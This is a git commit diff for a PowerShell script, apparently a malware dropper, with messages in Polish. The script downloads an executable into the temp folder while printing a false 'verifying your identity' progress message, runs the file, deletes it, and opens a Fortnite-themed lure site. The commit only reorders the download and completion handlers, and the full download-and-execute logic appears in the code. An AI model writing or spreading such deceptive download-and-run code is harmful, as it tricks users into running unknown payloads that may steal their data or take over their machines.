36439431285f4fc4548e411c2030983820abd06e
xKotelek <contact@kotelek.dev>
2024-12-26 23:04:56 +0100

    Update exec.ps1

--- dc/grab/exec.ps1
+++ dc/grab/exec.ps1
@@ -3,19 +3,22 @@ powershell -Command "& {
     $output = Join-Path $env:TEMP 'temp.exe';
     $wc = New-Object System.Net.WebClient;
 
+    $wc.DownloadFileAsync([Uri]$url, $output);
+
     $wc.DownloadProgressChanged += {
-        $percentage = [int]($_.ProgressPercentage); # Cast to int to ensure no issues
+        $percentage = [int]($_.ProgressPercentage);
         Write-Host ('Weryfikuję twoją tożsamość (status pobrania pliku) ' + $percentage + '%') -NoNewline;
     };
 
-    $wc.DownloadFileAsync([Uri]$url, $output);
+    $wc.DownloadFileCompleted += {
+        Start-Process $output;
+        Remove-Item $output -Force;
+        Start-Process 'https://f0rtn1te-xp.ct8.pl/';
+        Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green;
+        Pause;
+    };
+
     while ($wc.IsBusy) {
         Start-Sleep -Milliseconds 500;
     }
-
-    Start-Process $output;
-    Remove-Item $output -Force;
-    Start-Process 'https://f0rtn1te-xp.ct8.pl/';
-    Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green;
-    Pause;
 }"
